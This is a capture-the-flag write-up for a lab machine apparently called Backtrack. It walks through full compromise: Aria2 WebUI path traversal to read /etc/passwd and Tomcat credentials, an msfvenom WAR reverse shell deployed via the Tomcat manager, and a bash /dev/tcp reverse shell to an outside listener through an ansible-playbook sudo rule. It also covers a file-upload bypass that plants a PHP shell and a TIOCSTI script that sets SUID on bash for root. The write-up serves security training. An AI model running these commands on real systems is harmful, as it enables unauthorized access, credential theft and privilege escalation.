# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22 | SSH |
| 6800 | HTTP |
| 8080 | HTTP |
| 8888 | HTTP |

```
PORT STATE SERVICE REASON VERSION
22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 3072 55:41:5a:65:e3:d8:c2:4f:59:a1:68:b6:79:8a:e3:fb (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDzPMYVGNn9fk2sUO4qG8t3GP/3ztCkoIRFTSFwnaHtRTiIe8s3ulwJkAyTZHSmedBOMihmyWyEmA44uxY4kUZEiba8R+c7aWHjTvD04VcKWPgVg1URPWMTHyxUcwKGnoh8n6VwM283+/4f2g2GSj2pVbacoV3xfDo8L4PshyfHK7dEd2qnQv9Yge3p5Aw/1Q7w1eaMZnaoicgzDgjhvqrRcS/DRcp3Lwoz6fGQW2/vFxW7d5aisTslKxRPslTy/Vrgprb7I+D9kdGEFqW/DXDfZLo+4O0woecE6+qSYPbIAjvIao25MTR8xHOFR0sCtyVfehEXYxvJ0fsqBG4yp/y15eDT3MSYevdvhHH1ZLejV66zILbPqUhzFBuMW1U6PKvSNPiQdzlnIRpD8ZQN7KJI8Y6zlHgoh8iu7+PgcUQNixYrX1GhMCYwNGHQlLOLriVRzhScZV3ObH1V8+g8I2sc3WZ54G2XUqZX+pN3ugjN1L5mo8mht1m7ZME+W9if37U=
| 256 79:8a:12:64:cc:5c:d2:b7:38:dd:4f:07:76:4f:92:e2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJfVuy7uiXVmzWVPtY/BYF+RZF36ZR8rh7wxeZi7yeOdWd06henZf8z5rYfalc0YHr6kE3clVa0jq+pF64w/lso=
| 256 ce:e2:28:01:5f:0f:6a:77:df:1e:0a:79:df:9a:54:47 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHMk87a1jTdUzEWZNm/XtZKIto5reBlJr75kFdCKXscp
6800/tcp open http syn-ack aria2 downloader JSON-RPC
| http-methods:
|_ Supported Methods: OPTIONS
|_http-title: Site doesn't have a title.
8080/tcp open http syn-ack Apache Tomcat 8.5.93
|_http-favicon: Apache Tomcat
| http-methods:
|_ Supported Methods: GET HEAD POST
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/8.5.93
8888/tcp open sun-answerbook? syn-ack
| fingerprint-strings:
| GetRequest, HTTPOptions:
| HTTP/1.1 200 OK
| Content-Type: text/html
| Date: Thu, 27 Mar 2025 17:12:41 GMT
| Connection: close
| <!doctype html>
| <html>
| <!-- {{{ head -->
| <head>
| <link rel="icon" href="../favicon.ico" />
| <meta charset="utf-8">
| <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
| <meta name="viewport" content="width=device-width, initial-scale=1.0">
| <meta name="theme-color" content="#0A8476">
| <title ng-bind="$root.pageTitle">Aria2 WebUI</title>
| <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Lato:400,700">
| <link href="app.css" rel="stylesheet"><script type="text/javascript" src="vendor.js"></script><script type="text/javascript" src="app.js"></script></head>
| <!-- }}} -->
| <body ng-controller="MainCtrl" ng-cloak>
| <!-- {{{ Icons -->
```

# RECONNAISSANCE
---

Let's begin by visiting each website:


![Pasted image 20250327122142.png](../../IMAGES/Pasted%20image%2020250327122142.png)

Nothing visible on port `6800`, let's proceed:

![Pasted image 20250327122208.png](../../IMAGES/Pasted%20image%2020250327122208.png)

We got an apache tomcat `8.5.93` server, there's some directories I found by fuzzing but we need credentials in order to access them:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.37.202:8080/FUZZ" -ic -c -t 200

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://10.10.37.202:8080/FUZZ
 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 200
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

docs [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 335ms]
examples [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 160ms]
manager [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 161ms]
```

What about `8888`:

![Pasted image 20250327122311.png](../../IMAGES/Pasted%20image%2020250327122311.png)

We got a `Aria2 WebUI` application, let's try to find the server version:

![Pasted image 20250327122856.png](../../IMAGES/Pasted%20image%2020250327122856.png)


Let's try to search for an exploit:

![Pasted image 20250327122935.png](../../IMAGES/Pasted%20image%2020250327122935.png)

We got `CVE-2023-39141`, it talks about path traversal, let's try reproducing the PoC:

```
curl --path-as-is http://10.10.252.252:8888/../../../../../../../../../../../../../../../../../../../../etc/passwd
```


![Pasted image 20250327123112.png](../../IMAGES/Pasted%20image%2020250327123112.png)

It works, this is the `/etc/passwd` file:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:112:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:122:MySQL Server,,,:/nonexistent:/bin/false
tomcat:x:1002:1002::/opt/tomcat:/bin/false
orville:x:1003:1003::/home/orville:/bin/bash
wilbur:x:1004:1004::/home/wilbur:/bin/bash
```





# EXPLOITATION
---


Now that we know we got LFI, we can try reading `tomcat` configuration files, for example, let's try reading `/opt/tomcat/conf/tomcat-users.xml`:

```
curl --path-as-is "http://10.10.252.252:8888/../../../../../../../../opt/tomcat/conf/tomcat-users.xml"
<?xml version="1.0" encoding="UTF-8"?>
<tomcat-users xmlns="http://tomcat.apache.org/xml"
 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
 xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
 version="1.0">

 <role rolename="manager-script"/>
 <user username="tomcat" password="OPx52k53D8OkTZpx4fr" roles="manager-script"/>

</tomcat-users>
```

We got credentials, let's try reading the log files:

```
curl --path-as-is "http://10.10.252.252:8888/../../../../../../../../opt/tomcat/logs/catalina.out"
```


![Pasted image 20250327125210.png](../../IMAGES/Pasted%20image%2020250327125210.png)

We can find something interesting, a `reverse_shell.war` file was uploaded before, we can use this to do the following in order to get a shell:

If an user's got `manager-script` privileges on tomcat, we can use curl to deploy a reverse shell.


```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.6.34.159 LPORT=4444 -f war > shell.war
```


Not, let's do the following to upload the shell:

```
curl -u 'tomcat:OPx52k53D8OkTZpx4fr' -X PUT --data-binary @shell.war "http://10.10.252.252:8080/manager/text/deploy?path=/shell"
```

It says the following:

![Pasted image 20250327125749.png](../../IMAGES/Pasted%20image%2020250327125749.png)

Let's visit the url and start our listener:

```
curl http://10.10.252.252:8080/shell/
```


![Pasted image 20250327125832.png](../../IMAGES/Pasted%20image%2020250327125832.png)

There we go, we got our shell, let's begin privilege escalation.





# PRIVILEGE ESCALATION
---


First step is stabilizing our shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![Pasted image 20250327130031.png](../../IMAGES/Pasted%20image%2020250327130031.png)

We can try reading our privileges:

![Pasted image 20250327130213.png](../../IMAGES/Pasted%20image%2020250327130213.png)

Let's check that directory:

![Pasted image 20250327130356.png](../../IMAGES/Pasted%20image%2020250327130356.png)

We can follow these notes to perform the `ansible playbook` privilege escalation:

Notes: https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/ 

```
echo '/bin/bash -i >& /dev/tcp/10.6.34.159/1234 0>&1' > /tmp/wilbur.sh
```

We can now create a `.yml` script with the following contents:

```yml
- hosts: localhost
 tasks:
 - name: RShell
 command: bash /tmp/wilbur.sh
```


We need to give both scripts `777` privilege rights and then we can run this:

```
sudo -u wilbur /usr/bin/ansible-playbook /opt/test_playbooks/../../tmp/privesc.yml
```

Remember to set another listener and then send the command:

![Pasted image 20250327132538.png](../../IMAGES/Pasted%20image%2020250327132538.png)

We got our shell, let's stabilize it again:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![Pasted image 20250327132625.png](../../IMAGES/Pasted%20image%2020250327132625.png)

Nice, we can check these files in `wilbur` home:


```
wilbur@Backtrack:/tmp$ ls -la /home/wilbur/
total 28
drwxrwx--- 3 wilbur wilbur 4096 Mar 27 18:25 .
drwxr-xr-x 4 root root 4096 Mar 9 2024 ..
drwxrwxr-x 3 wilbur wilbur 4096 Mar 27 18:25 .ansible
lrwxrwxrwx 1 root root 9 Mar 9 2024 .bash_history -> /dev/null
-rw-r--r-- 1 wilbur wilbur 3771 Mar 9 2024 .bashrc
-rw------- 1 wilbur wilbur 48 Mar 9 2024 .just_in_case.txt
lrwxrwxrwx 1 root root 9 Mar 9 2024 .mysql_history -> /dev/null
-rw-r--r-- 1 wilbur wilbur 1010 Mar 9 2024 .profile
-rw------- 1 wilbur wilbur 461 Mar 9 2024 from_orville.txt
```

Let's read those files:

```
wilbur@Backtrack:/tmp$ cat /home/wilbur/from_orville.txt

Hey Wilbur, it's Orville. I just finished developing the image gallery web app I told you about last week, and it works just fine. However, I'd like you to test it yourself to see if everything works and secure.
I've started the app locally so you can access it from here. I've disabled registrations for now because it's still in the testing phase. Here are the credentials you can use to log in:

email : orville@backtrack.thm
password : W34r3B3773r73nP3x3l$
```

```
wilbur@Backtrack:/tmp$ cat /home/wilbur/.just_in_case.txt
in case i forget :

wilbur:mYe317Tb9qTNrWFND7KF
```

With those credentials, we can do the following, based on the note, there must be another website running locally, let's check it out:

```
wilbur@Backtrack:/tmp$ netstat -tuln | grep LISTEN
tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN
tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN
tcp 0 0 127.0.0.1:33060 0.0.0.0:* LISTEN
tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN
tcp 0 0 0.0.0.0:6800 0.0.0.0:* LISTEN
tcp 0 0 127.0.0.1:80 0.0.0.0:* LISTEN
tcp6 0 0 :::22 :::* LISTEN
tcp6 0 0 :::8888 :::* LISTEN
tcp6 0 0 127.0.0.1:8005 :::* LISTEN
tcp6 0 0 :::8080 :::* LISTEN
tcp6 0 0 :::6800 :::* LISTEN
```

There we go, it's the one located at port `80`, with the credentials we've found, we can do port forwarding to access the resource in our machine:

```
ssh -L 9000:localhost:80 wilbur@10.10.151.49
```

Let's now access the website:

![Pasted image 20250327133549.png](../../IMAGES/Pasted%20image%2020250327133549.png)

Since we got credentials, let's just access:

```
email : orville@backtrack.thm
password : W34r3B3773r73nP3x3l$
```


![Pasted image 20250327133633.png](../../IMAGES/Pasted%20image%2020250327133633.png)

If we try uploading a `.php` file, we get this:

![Pasted image 20250327133933.png](../../IMAGES/Pasted%20image%2020250327133933.png)

Let's send an image and check the behavior in our proxy, since this is a `localhost` server, our proxy may not be able to intercept the request, for this, let's simply make these two simple changes:

1. Go to `about:config` on Firefox search bar, then, search for `network.proxy.allow_hijacking_localhost` and set the value to true.
2. If you're still not able to intercept traffic, modify the `/etc/hosts` file in the following way:

```
127.0.0.1 localhost.com
```

In this way, the proxy will think we are dealing with an external web application and it will capture the request, we simply need to visit:

```
http://localhost.com:9000/dashboard.php
```


Just then, the proxy will start intercepting our requests, let's send a file:

![Pasted image 20250327140628.png](../../IMAGES/Pasted%20image%2020250327140628.png)

Now we can see the request in our proxy.

Since we got some filters on the machine, we can try some bypasses to it, for example, let's upload an image and change the final extension to:

```
.png.php
```

![Pasted image 20250327141101.png](../../IMAGES/Pasted%20image%2020250327141101.png)

As seen, it gets uploaded, the upload directory is `uploads`, but in this directory we can only download files, not execute code, for this we can try another technique, we can try using path traversal to upload our file in a different directory:

```
%252e%252e%252fUntitled.png
```


![Pasted image 20250327141314.png](../../IMAGES/Pasted%20image%2020250327141314.png)

To check if it worked, we can try visiting:

```
localhost:9000/Untitled.png
```

![Pasted image 20250327141355.png](../../IMAGES/Pasted%20image%2020250327141355.png)

There we go, we were able to change the directory where our uploads go into, let's try some basic stuff, let's try reading the php info, for this, change the extension to .php at the end and add this:

```
%252e%252e%252ftest.png.php
```

```
<?php phpinfo();?>
```

![Pasted image 20250327142014.png](../../IMAGES/Pasted%20image%2020250327142014.png)

It uploaded, let's check if it worked:

![Pasted image 20250327142031.png](../../IMAGES/Pasted%20image%2020250327142031.png)

There we go, next step would be uploading a reverse shell, let's do it:

![Pasted image 20250327142217.png](../../IMAGES/Pasted%20image%2020250327142217.png)

It worked, let's set up our listener and visit the page:

![Pasted image 20250327142250.png](../../IMAGES/Pasted%20image%2020250327142250.png)

There we go, we got our shell, we need to stabilize it again:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![Pasted image 20250327142336.png](../../IMAGES/Pasted%20image%2020250327142336.png)

With a shell as orville, we can use `linpeas` to search for any way to get into root:

![Pasted image 20250327142846.png](../../IMAGES/Pasted%20image%2020250327142846.png)

We can see some file called `web_snapshot.zip`, let's check what its about:

![Pasted image 20250327143206.png](../../IMAGES/Pasted%20image%2020250327143206.png)

We got credentials to the db, inside of it, we cannot find anything important such as root password:

![Pasted image 20250327143620.png](../../IMAGES/Pasted%20image%2020250327143620.png)

Now, we can try to monitor the processes using `pspy`, let's do it:

![Pasted image 20250327144215.png](../../IMAGES/Pasted%20image%2020250327144215.png)


We can see this, there's a `su - orville` since there are some other processes running before this, we must conclude that the root user is switching to orville, after searching for a while, I found this:

![Pasted image 20250327144608.png](../../IMAGES/Pasted%20image%2020250327144608.png)

![Pasted image 20250327144639.png](../../IMAGES/Pasted%20image%2020250327144639.png)


Website: https://www.errno.fr/TTYPushback.html


We can see it's the same case we are dealing with, let's copy the contents of the python script to a file in `orville` home:

```python
#!/usr/bin/env python3
import fcntl
import termios
import os
import signal

os.kill(os.getppid(), signal.SIGSTOP)

for char in 'chmod +s /bin/bash\n':
 fcntl.ioctl(0, termios.TIOCSTI, char)
```

Since we are `orville`, we can modify the `.bashrc` file, after writing the script, we can do the following:

```
echo 'python3 /home/orville/rootesc.py' >> /home/orville/.bashrc
```

And finally, we can use:

```
bash -p
```

![Pasted image 20250327145752.png](../../IMAGES/Pasted%20image%2020250327145752.png)

Since we are finally root, let's read all flags, since I don't know where they are, let's simply find them:

```
find / -name flag* 2>/dev/null

/opt/tomcat/flag1.txt
/home/orville/flag2.txt
/root/flag3.txt
```

```
bash-5.0# cat /opt/tomcat/flag1.txt
THM{823e4e40ead9683b06a8194eab01cee8}
```

```
bash-5.0# cat /home/orville/flag2.txt
THM{01d8e83d0ea776345fa9bf4bc08c249d}
```

```
bash-5.0# cat /root/flag3.txt

â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ•—â–‘â–‘â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ•—â–‘â–‘â–ˆâ–ˆâ•—
â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–‘â–ˆâ–ˆâ•”â•â•šâ•â•â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–‘â–ˆâ–ˆâ•”â•
â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•¦â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–‘â–‘â•šâ•â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•â•â–‘â–‘â–‘â–‘â–ˆâ–ˆâ•‘â–‘â–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–‘â–‘â•šâ•â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•â•â–‘
â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•—â–‘â–‘â–‘â–‘â–ˆâ–ˆâ•‘â–‘â–‘â–‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•—â–‘
â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•¦â•â–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–‘â•šâ–ˆâ–ˆâ•—â–‘â–‘â–‘â–ˆâ–ˆâ•‘â–‘â–‘â–‘â–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–‘â•šâ–ˆâ–ˆâ•—
â•šâ•â•â•â•â•â•â–‘â•šâ•â•â–‘â–‘â•šâ•â•â–‘â•šâ•â•â•â•â•â–‘â•šâ•â•â–‘â–‘â•šâ•â•â–‘â–‘â–‘â•šâ•â•â–‘â–‘â–‘â•šâ•â•â–‘â–‘â•šâ•â•â•šâ•â•â–‘â–‘â•šâ•â•â–‘â•šâ•â•â•â•â•â–‘â•šâ•â•â–‘â–‘â•šâ•â•

THM{f728e7c00162e6d316720155a4a06fa8}
```

![Pasted image 20250327150045.png](../../IMAGES/Pasted%20image%2020250327150045.png)


